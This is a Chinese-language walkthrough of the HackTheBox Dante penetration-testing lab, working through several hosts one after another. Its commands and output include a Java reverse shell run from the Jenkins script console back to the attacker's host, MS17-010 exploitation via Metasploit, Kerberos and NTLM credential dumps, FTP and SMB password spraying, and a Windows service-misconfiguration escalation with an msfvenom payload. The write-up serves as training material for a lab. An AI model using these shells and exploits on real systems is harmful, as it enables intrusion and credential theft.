  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/e1143711-72bb-454b-8b55-4014cd7c64bd/\e1143711-72bb-454b-8b55-4014cd7c64bd\e1143711-72bb-454b-8b55-4014cd7c64bd
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# nc -lnvp 2012
listening on [any] 2012 ...
connect to [10.10.16.71] from (UNKNOWN) [10.10.110.3] 40375
Microsoft Windows [Version 10.0.19042.1766]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>
type flag.txt
DANTE{D0nt_M3ss_With_MinatoTW}

```

# 172.16.1.19
## 端口扫描
```c
root@DANTE-NIX04:/root# export ip=172.16.1.19; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 80
Port open 8080
Port open 33060
```

## Jenkins凭据
![](/image/prolabs/Dante-31.png)

根据172.16.2.5靶机拿到的Jenkins服务凭据

**Admin_129834765 / SamsungOctober102030**

![](/image/prolabs/Dante-32.png)

在 Jenkins 控制面板中，我们发现了一个flag标志：**  
****DANTE{to_g0_4ward_y0u_mus7_g0_back}**

![](/image/prolabs/Dante-33.png)

## 提权
仍然在 Jenkins 中，进入“管理 Jenkins”>“脚本控制台”

![](/image/prolabs/Dante-34.png)

### 提权-jenkins
输入以下脚本，这是一个反向 shell：

```c
String host="10.10.X.Y";
int port=1111;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```c
(remote) jenkins@DANTE-NIX07:/$ 
```

这里好卡啊

### 提权-ian 
和之前一样，我们运行 `./pspy` ，并找到一个包含 ian 凭据的 cron 作业：

```c
2021/11/12 04:31:01 CMD: UID=0    PID=22110 | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC
```

```c
ian@DANTE-NIX07:/etc/cron.d$ id
uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)
```

我们可以看到 ian 属于“Disk”组，该组允许访问 /dev/ 中的块设备；我们首先检查已挂载的磁盘：

```c
ian@DANTE-NIX07:/etc/cron.d$ cat /proc/self/mounts|grep 'sda'
/dev/sda5 / ext4 rw,relatime,errors=remount-ro 0 0
/* /dev/sda5：这是你第 5 个分区，通常是系统根分区。 /：挂载点是根目录。rw代表读写*/

/dev/sda1 /boot/efi vfat rw,relatime,fmask=0077,dmask=0077,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro 0 0
```

/ 文件夹已挂载到 /dev/sda5，并且“disk”组对其拥有读/写权限。我们将使用 debugfs 读取它：

```c
ian@DANTE-NIX07:/etc/cron.d$ debugfs /dev/sda5
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /root/flag.txt
DANTE{g0tta_<3_ins3cur3_GROupz!}
debugfs: 
```

# 172.16.1.20-DC01
## 端口扫描
```c
root@DANTE-NIX04:/root# export ip=172.16.1.20; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 22
Port open 53
Port open 80
Port open 88
Port open 135
Port open 139
Port open 389
Port open 443
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3268
Port open 3269
Port open 3389
Port open 5985
Port open 8912
Port open 9389
Port open 47001
Port open 49152
Port open 49153
Port open 49154
Port open 49155
Port open 49157
Port open 49158
Port open 49159
Port open 49171
Port open 49178
Port open 49181
Port open 49192
Port open 49236
Port open 65500
Port open 65520
```

很明显这是一个域控

### 🟢 基础服务
| 端口 | 协议 | 服务 | 说明 |
| --- | --- | --- | --- |
| 21 | TCP | FTP | 文件传输服务（可能明文） |
| 22 | TCP | SSH | Linux / *nix 远程管理 |
| 53 | TCP | DNS | 域名解析服务 |
| 80 | TCP | HTTP | Web 服务 |
| 443 | TCP | HTTPS | 加密 Web 服务 |
| 3389 | TCP | RDP | Windows 远程桌面 |


---

### 🟡 Windows / 域控相关（**重点区域**）
| 端口 | 协议 | 服务 | 含义 |
| --- | --- | --- | --- |
| 88 | TCP | Kerberos | 域身份认证（**域控强特征**） |
| 135 | TCP | RPC | Windows RPC 端点映射 |
| 139 | TCP | NetBIOS | 旧版 SMB |
| 445 | TCP | SMB | 文件共享 / 身份认证（重点） |
| 389 | TCP | LDAP | 域目录服务 |
| 636 | TCP | LDAPS | 加密 LDAP |
| 3268 | TCP | GC | 全局编录（域森林） |
| 3269 | TCP | GC SSL | 加密全局编录 |
| 464 | TCP | Kerberos | 密码修改 / 票据 |
| 593 | TCP | RPC over HTTP | RPC 封装 |


👉 **88 + 389 + 445 + 3268**  
👉 几乎可以直接判定：**这是 Active Directory 域控**

---

### 🟠 远程管理 / 自动化接口
| 端口 | 协议 | 服务 | 说明 |
| --- | --- | --- | --- |
| 5985 | TCP | WinRM (HTTP) | Windows 远程管理 |
| 47001 | TCP | WinRM 内部 | WSMan 管理通道 |
| 9389 | TCP | AD Web Services | AD 管理接口 |


---

### 🔵 动态 RPC 端口（Windows 特征）
| 端口范围 | 用途 |
| --- | --- |
| 49152–49159 | |
| 49171 | |
| 49178 | |
| 49181 | |
| 49192 | |
| 49236 | |


说明：

+ Windows RPC **动态端口池**
+ DCOM / WMI / AD / 服务通信会用
+ **不是漏洞本身，只是“信号”**

---

### 🟣 非常规 / 需要留意
| 端口 | 备注 |
| --- | --- |
| 65500 | 非标准，高位端口 |
| 65520 | 非标准，高位端口 |
| 8912 | 非常规服务，需具体识别 |


## 80端口
![](/image/prolabs/Dante-35.png)

可以看见这是一台windows 2012 r2 essentials的机器

windows2012联想到永恒之蓝

## ms17_010_psexec
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
└─# proxychains -q msfconsole
Metasploit tip: Set the current module's RHOSTS with database values using 
hosts -R or services -R
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,                    
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,                 
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:               
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,             
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo            
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk           
 oMMMMMMMMMMx.                    dMMMMMMMMMMx          
.WMMMMMMMMM:                       :MMMMMMMMMM,         
xMMMMMMMMMo                         lMMMMMMMMMO         
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;  
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:   
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:     
xMMMMMMMMMd                        ,0MMMMMMMMMMK;       
.WMMMMMMMMMc                         'OMMMMMM0,         
 lMMMMMMMMMMk.                         .kMMO'           
  dMMMMMMMMMMWd'                         ..             
   cWMMMMMMMMMMMNxc'.                ##########         
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1678 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 172.16.1.20
RHOSTS => 172.16.1.20
msf6 exploit(windows/smb/ms17_010_psexec) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > check
[*] 172.16.1.20:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.16.1.20:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 172.16.1.20:445       - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.20:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 61.139.2.130:4444 
[*] 172.16.1.20:445 - Target OS: Windows Server 2012 R2 Standard 9600
[*] 172.16.1.20:445 - Built a write-what-where primitive...
[+] 172.16.1.20:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.20:445 - Selecting PowerShell target
[*] 172.16.1.20:445 - Executing the payload...
[+] 172.16.1.20:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 61.139.2.130:4444 
[*] 172.16.1.20:445 - Target OS: Windows Server 2012 R2 Standard 9600
[*] 172.16.1.20:445 - Built a write-what-where primitive...
[+] 172.16.1.20:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.20:445 - Selecting PowerShell target
[*] 172.16.1.20:445 - Executing the payload...
[+] 172.16.1.20:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_psexec) > 
```

？？？怎么失败了

噢噢忘记设置lhost lport了

```c
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 10.10.16.71:5213 
[*] 172.16.1.20:445 - Target OS: Windows Server 2012 R2 Standard 9600
[*] 172.16.1.20:445 - Built a write-what-where primitive...
[+] 172.16.1.20:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.20:445 - Selecting PowerShell target
[*] 172.16.1.20:445 - Executing the payload...
[+] 172.16.1.20:445 - Service start timed out, OK if running a command or non-service executable...
[*] Command shell session 1 opened (10.10.16.71:5213 -> 10.10.110.3:35907) at 2026-01-31 23:18:04 +0800


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\Users\katwamba\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0576-7346

 Directory of C:\Users\katwamba\Desktop

04/14/2021  09:44 AM    <DIR>          .
04/14/2021  09:44 AM    <DIR>          ..
06/10/2020  12:32 PM             8,790 employee_backup.xlsx
01/08/2021  12:29 PM                37 flag.txt
               2 File(s)          8,827 bytes
               2 Dir(s)   9,659,576,320 bytes free

C:\Users\katwamba\Desktop>type flag.txt
type flag.txt
DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}

```

看到桌面上有一个表格，想办法下载

```c
C:\Users\katwamba\Desktop>dowload employee_backup.xlsx /home/kali/Desktop/htb/dante/
dowload employee_backup.xlsx /home/kali/Desktop/htb/dante/
'dowload' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\katwamba\Desktop>background

Background session 1? [y/N]  y

sessions -u 1   //session升级

sessions

Active sessions
===============

  Id  Name  Type          Information    Connection
  --  ----  ----          -----------    ----------
  1         shell x86/wi  Shell Banner:  10.10.16.71:5
            ndows          Microsoft Wi  213 -> 10.10.
                          ndows [Versio  110.3:35907 (
                          n 6.3.9600] -  172.16.1.20)
                          ----
  2         meterpreter   NT AUTHORITY\  10.10.16.71:4
            x64/windows   SYSTEM @ DANT  433 -> 10.10.
                          E-DC01         110.3:37534 (
                                         172.16.1.20)

msf6 exploit(windows/smb/ms17_010_psexec) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

## mimikatz
```c
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain  NTLM             SHA1
--------     ------  ----             ----
DANTE-DC01$  DANTE   e7b14780afe232d  037eaa1e1091c659
                     f15cbd96ea62713  16b059ffd041fd5e
                     e5               2d5ef11c
katwamba     DANTE   14a71f9e65448d8  61d3cacf6ad5f457
                     3e8c63d46355837  1747b302a9658f7e
                     c3               85c5d516
xadmin       DANTE   649f65073a6672a  b57e3049b5960ed6
                     9898cb4eb61f968  0f1baa679fb0cfd4
                     4a               f68b0b06

wdigest credentials
===================

Username     Domain  Password
--------     ------  --------
(null)       (null)  (null)
DANTE-DC01$  DANTE   (null)
katwamba     DANTE   (null)
xadmin       DANTE   (null)

kerberos credentials
====================

Username     Domain       Password
--------     ------       --------
(null)       (null)       (null)
DANTE-DC01$  DANTE.local  6d ba aa 06 27 0f 1c e1 55 7
                          6 49 e6 7b 2e e9 65 ae 83 70
                           51 30 41 ae 46 02 36 5b 3a
                          6d 8a 83 63 7b 8f af 8b 41 3
                          2 a4 ae 2f bd cb 2a ed 99 f1
                           12 6d 52 da 5c 40 79 ac 07
                          10 a0 0e a8 ac ff 90 16 8f b
                          b b6 63 7a 8e 3a 73 81 60 54
                           6c bb 95 ea 81 4f b5 1d ba
                          8c e8 ed c9 0d 92 a0 cb 4e 5
                          b 4d 55 98 8f a1 56 97 48 b5
                           d4 04 3e 7f 9e 08 f9 30 4f
                          a1 d2 d9 6e 04 0f 9c b0 f3 9
                          d 2b 8c f2 bd 4d 37 48 30 dc
                           6b e9 7e 30 eb a6 80 97 37
                          22 8c e0 8f 04 d1 ee a2 a6 5
                          c 3a 8f 2e 12 f8 3f ee 59 2d
                           56 89 cc d6 24 91 ed 7f e8
                          5d 82 82 45 80 47 2c 11 55 9
                          6 40 5a 94 d9 cf 9e 56 3a ca
                           9f 8f 14 4b 4c a8 41 05 19
                          99 11 0c 05 98 d8 f7 ea f0 1
                          7 45 c0 4b 38 ea 20 76 7b a9
                           05 ed 78 48 3f 80 0e c7 bb
                          18 7a b6 38 8b 7d 1f 74 a3 1
                          2 26 5e f5 46 73 1c
dante-dc01$  DANTE.LOCAL  (null)
katwamba     DANTE.LOCAL  (null)
xadmin       DANTE.local  Peacemaker!
xadmin       DANTE.LOCAL  (null)


meterpreter > creds_kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

Username     Domain       Password
--------     ------       --------
(null)       (null)       (null)
DANTE-DC01$  DANTE.local  6d ba aa 06 27 0f 1c e1 55 7
                          6 49 e6 7b 2e e9 65 ae 83 70
                           51 30 41 ae 46 02 36 5b 3a
                          6d 8a 83 63 7b 8f af 8b 41 3
                          2 a4 ae 2f bd cb 2a ed 99 f1
                           12 6d 52 da 5c 40 79 ac 07
                          10 a0 0e a8 ac ff 90 16 8f b
                          b b6 63 7a 8e 3a 73 81 60 54
                           6c bb 95 ea 81 4f b5 1d ba
                          8c e8 ed c9 0d 92 a0 cb 4e 5
                          b 4d 55 98 8f a1 56 97 48 b5
                           d4 04 3e 7f 9e 08 f9 30 4f
                          a1 d2 d9 6e 04 0f 9c b0 f3 9
                          d 2b 8c f2 bd 4d 37 48 30 dc
                           6b e9 7e 30 eb a6 80 97 37
                          22 8c e0 8f 04 d1 ee a2 a6 5
                          c 3a 8f 2e 12 f8 3f ee 59 2d
                           56 89 cc d6 24 91 ed 7f e8
                          5d 82 82 45 80 47 2c 11 55 9
                          6 40 5a 94 d9 cf 9e 56 3a ca
                           9f 8f 14 4b 4c a8 41 05 19
                          99 11 0c 05 98 d8 f7 ea f0 1
                          7 45 c0 4b 38 ea 20 76 7b a9
                           05 ed 78 48 3f 80 0e c7 bb
                          18 7a b6 38 8b 7d 1f 74 a3 1
                          2 26 5e f5 46 73 1c
dante-dc01$  DANTE.LOCAL  (null)
katwamba     DANTE.LOCAL  (null)
xadmin       DANTE.local  Peacemaker!


meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username     Domain  NTLM             SHA1
--------     ------  ----             ----
DANTE-DC01$  DANTE   e7b14780afe232d  037eaa1e1091c659
                     f15cbd96ea62713  16b059ffd041fd5e
                     e5               2d5ef11c
katwamba     DANTE   14a71f9e65448d8  61d3cacf6ad5f457
                     3e8c63d46355837  1747b302a9658f7e
                     c3               85c5d516
xadmin       DANTE   649f65073a6672a  b57e3049b5960ed6
                     9898cb4eb61f968  0f1baa679fb0cfd4
                     4a               f68b0b06


meterpreter > 
```

## 内网探测
```c
C:\Users>for /L %i in (1,1,255) do @ping -n 1 -w 200 172.16.2.%i | find "TTL="
Reply from 172.16.2.5: bytes=32 time=1ms TTL=127

C:\Users>for /L %i in (1,1,255) do @ping -n 1 -w 200 172.16.5.%i | find "TTL="
```

## ip情况
```c
C:\Users>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::f026:e096:a081:a8cf%12
   IPv4 Address. . . . . . . . . . . : 172.16.1.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.1.1

Tunnel adapter isatap.{FD7A8D12-4AEA-4664-9A7A-E849B18391E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
```

## 下载材料
```c
meterpreter > cd C:\\Users\\katwamba\\Desktop
meterpreter > download employee_backup.xlsx /home/kali/Desktop/htb/dante/employee_backup.xlsx
[*] Downloading: employee_backup.xlsx -> /home/kali/Desktop/htb/dante/employee_backup.xlsx
[*] Downloaded 8.58 KiB of 8.58 KiB (100.0%): employee_backup.xlsx -> /home/kali/Desktop/htb/dante/employee_backup.xlsx
[*] Completed  : employee_backup.xlsx -> /home/kali/Desktop/htb/dante/employee_backup.xlsx
```

![](/image/prolabs/Dante-36.png)

为啥A列旁边就是C列

拉伸B列间距

A 列是潜在的用户名，B 列（必须揭晓）是对应的密码：

![](/image/prolabs/Dante-37.png)

## net user
![](/image/prolabs/Dante-38.png)

![](/image/prolabs/Dante-39.png)

```c
C:\Users>net users mrb3n
net users mrb3n
User name                    mrb3n
Full Name                    mrb3n
Comment                      mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/31/2020 3:43:25 PM
Password expires             1/27/2021 3:43:25 PM
Password changeable          7/31/2020 3:43:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

# 172.16.1.101
## 端口扫描
```c
root@DANTE-NIX04:/root# export ip=172.16.1.101; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 21
Port open 135
Port open 139
Port open 445
Port open 5040
Port open 5985
Port open 47001
Port open 49664
Port open 49665
Port open 49666
Port open 49667
Port open 49668
Port open 49669
Port open 49670
```

> ** 21 — FTP  **
>
> **445 / 139 — SMB（重点）**
>
> **5985 — WinRM（超级重要）**
>
> **135 — RPC**
>
> **47001-windows内置管理端口**
>
> **49664–49670  Windows 动态 RPC 端口池  **
>

FTP 服务器使用的是 0.9.60 beta 版本，该版本似乎没有已知的漏洞。此外，如果我们将其安装到自己的电脑上，会发现默认情况下没有账户锁定；让我们使用 Excel 文件中的凭据吧！

在 Meterpreter 中，使用 **ftp_login** 模块：

```c
Princess1
Summer2019
P45678!
Password1
Teacher65
4567Holiday1
acb123
WorldOfWarcraft67
RopeBlackfieldForwardslash
JuneJuly1TY
FinalFantasy7
65RedBalloons
WestminsterOrange5
MarksAndSparks91
Bullingdon1
Sheffield23
PowerfixSaturdayClub777
Tanenbaum0001
SuperStrongCantForget123456789
```

```c
asmith
smoggat
tmodle
ccraven
kploty
jbercov
whaguey
dcamtan
tspadly
ematlis
fglacdon
tmentrso
dharding
smillar
bjohnston
iahmed
plongbottom
jcarrot
lgesley

```

```c
paste ftp_users.txt ftp_passwords.txt | sed 's/\t/:/' > ftp_userpass.txt
```



## ftp爆破
```c
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 172.16.1.101
set STOP_ON_SUCCESS true
run
```

我们发现 Excel 中的 dharding / WestminsterOrange5 连接正常！让我们手动连接：

## ftp连接
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains ftp dharding@172.16.1.101
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  172.16.1.101:21  ...  OK
Connected to 172.16.1.101.
220-FileZilla Server 0.9.60 beta
220 DANTE-FTP
331 Password required for dharding
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

## Remote login.txt 下载
```c
ftp> ls
229 Entering Extended Passive Mode (|||55581|)
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  172.16.1.101:55581  ...  OK
150 Opening data channel for directory listing of "/"
-r--r--r-- 1 ftp ftp            261 Jul 13  2020 Remote login.txt
226 Successfully transferred "/"
ftp>get "Remote login.txt"
local: Remote login.txt remote: Remote login.txt
229 Entering Extended Passive Mode (|||64919|)
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  172.16.1.101:64919  ...  OK
150 Opening data channel for file download from server of "/Remote login.txt"
100% |***********|   261        1.64 KiB/s    00:00 ETA
226 Successfully transferred "/Remote login.txt"
261 bytes received in 00:00 (1.64 KiB/s)
ftp> 
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# cat Remote\ login.txt 
Dido,
I've had to change your account password due to some security issues we have recently become aware of

It's similar to your FTP password, but with a different number (ie. not 5!)

Come and see me in person to retrieve your password.

thanks,
James   

Dido，迪多，
由于我们最近发现了一些安全问题，我不得不更改你的账户密码。
它和你的 FTP 密码相似，只是数字不同（例如，不是 5！）
请亲自来找我领取你的新密码。
谢谢，
James詹姆斯
```

dharding / WestminsterOrange?

进行ssh爆破

## 生成字典
```c
 for i in {0..100};do echo "WestminsterOrange$i" >> smb_words.txt;done
```

## smb爆破
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q crackmapexec smb 172.16.1.101 -u dharding -p smb_words.txt 

SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange15 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange16 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [+] DANTE-WS02\dharding:WestminsterOrange17 

```

拿到凭据dharding:WestminsterOrange17 

## Evil-WinRM连接
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\dharding\Documents>
*Evil-WinRM* PS C:\Users\dharding\Documents> type ..\Desktop\flag.txt
DANTE{superB4d_p4ssw0rd_FTW}

```

## 提权
### 一、结论
这道题本质是：

**普通用户 → 修改 SYSTEM 服务的配置 → 执行任意程序 → SYSTEM 权限**

❗️**不是** Unquoted Service Path  
✅ 是 **Service Misconfiguration（服务权限错误）**

---

### 二、完整提权步骤
假设你当前 shell：  
`dharding`（普通用户）  
工具：`Evil-WinRM`

---

#### Step 1：枚举已安装的第三方软件（为什么要做）
##### 命令
```powershell
dir "C:\Program Files (x86)"
```

##### 知识点 🧠
+ 微软自带服务 → 权限一般没问题
+ **第三方软件（杀毒、卸载器、更新器）**
    - 经常有 **服务权限配置错误**
    - CTF / 真环境都爱考

你发现了：

```plain
IObit
```

在这台主机上，如果我们列出已安装的软件，会发现 IObit Uninstaller；9.5 版本存在未加引号的服务路径漏洞（ [https://www.exploit-db.com/exploits/48543](https://www.exploit-db.com/exploits/48543) ）：

```c
标题：IObit Uninstaller 9.5.0.15 ——「IObit Uninstaller Service」未加引号的服务路径（Unquoted Service Path）

作者：Gobinathan L
日期：2020-06-03
厂商主页：https://www.iobit.com

软件下载地址：https://www.iobit.com/en/advanceduninstaller.php

版本：9.5.0.15
测试环境：Windows 10 64 位（英文版）

关于未加引号的服务路径（Unquoted Service Path）：

=================================

当 Windows 服务的可执行文件路径中包含空格，但没有使用双引号包裹时，就会产生一种称为 Unquoted Service Path（未加引号的服务路径） 的漏洞。

如果该服务是以 SYSTEM（本地系统）权限 运行的（大多数服务都是），
攻击者就可能通过该漏洞 提升权限到 SYSTEM。

漏洞复现步骤：

=============================

1️⃣ 打开 CMD，执行以下命令来检查是否存在未加引号的服务路径漏洞：
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """


该命令会列出：

启动模式为自动（auto）

不在 C:\Windows\ 目录下

且路径中没有双引号的服务

2️⃣ 如果存在漏洞服务，它会显示在结果中
3️⃣ 查看该服务的配置和权限：
sc qc IObitUnSvr

4️⃣ 返回结果如下：
C:\>sc qc IObitUnSvr
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: IObitUnSvr
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : IObit Uninstaller Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

5️⃣ 结论

该服务：

以 LocalSystem（SYSTEM）权限运行

属于 机器上的最高权限级别

6️⃣ 使用 msfvenom 或其他工具生成一个 payload，并命名为：
IObit.exe

7️⃣ 确认你对以下目录拥有写权限：
C:\Program Files (x86)\IObit\

8️⃣ 如果你有写权限，将生成的 IObit.exe 放入该目录：
C:\Program Files (x86)\IObit\IObit.exe


⚠️ 原因说明（隐含逻辑）
Windows 在解析未加引号的服务路径时，会按空格拆分路径并优先尝试执行前面的路径：

C:\Program Files (x86)\IObit\IObit.exe


会先于真正的：

C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe

9️⃣ 重启服务以触发 payload 执行：
sc stop IObitUnSvr
sc start IObitUnSvr

🔟 如果 payload 是用 msfvenom 生成的，成功拿到 SYSTEM 后，立即迁移进程：
meterpreter > run post/windows/manage/migrate


可以迁移到任意稳定的 SYSTEM 进程中

测试时使用的 payload：

=========================

msfvenom -p windows/meterpreter/reverse_tcp -f exe -o IObit.exe

免责声明：

=========================

本文所提供的信息均以“原样（as-is）”方式提供，不提供任何形式的保证。
作者不对因使用或误用本文信息所造成的任何损害负责。
作者禁止任何人将本文中的安全信息或漏洞用于恶意用途。
```

---

#### Step 2：确认软件版本（是不是“老+脆”）
```powershell
type "C:\Program Files (x86)\IObit\IObit Uninstaller\History.txt"
```

看到：

```plain
v9.5
```

##### 知识点 🧠
+ 老版本 = 设计不规范
+ 很多厂商：
    - 服务默认给 `Users` / 某用户 **写权限**

---

#### Step 3：枚举服务配置（判断提权价值）
```powershell
sc.exe qc IObitUnSvr
```

关键输出：

```plain
SERVICE_NAME: IObitUnSvr
BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
SERVICE_START_NAME : LocalSystem
```

---

##### 知识点 🧠：sc qc 看什么？
| 字段 | 意义 |
| --- | --- |
| SERVICE_NAME | 服务真实名称 |
| BINARY_PATH_NAME | 启动执行的程序 |
| SERVICE_START_NAME | **运行身份** |


⚠️ **重点**

```plain
LocalSystem
```

👉 **这就是 SYSTEM 权限**

---

#### Step 4：确认是不是“真 · 未加引号服务路径漏洞”
##### 判断标准（记住）
Unquoted Service Path **必须满足两个条件**：

1️⃣ `binPath`**没加引号**  
2️⃣ **中间存在你能写的路径**

---

##### 本题路径：
```plain
C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

❌ 你不能写：

+ `C:\`
+ `C:\Program Files (x86)\`

👉 **所以：不能用 Program.exe 那套**

⚠️ **WP 这里是误导的**

---

#### Step 5：真正的致命点 —— 服务权限（重点中的重点）
##### 枚举服务 ACL
```powershell
"IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access
```

你看到：

```plain
IdentityReference : DANTE-WS02\dharding
ServiceRights     :
  QueryConfig
  ChangeConfig
  Start
  Stop
```

---

#### Step 6：解释这些权限到底有多离谱
##### ChangeConfig 是什么？
👉 **允许修改服务配置**

包括：

+ `binPath`
+ `StartType`
+ `ServiceAccount`

---

##### 攻击链瞬间成立：
```plain
我能改 binPath
↓
服务以 SYSTEM 运行
↓
我让它执行我的程序
↓
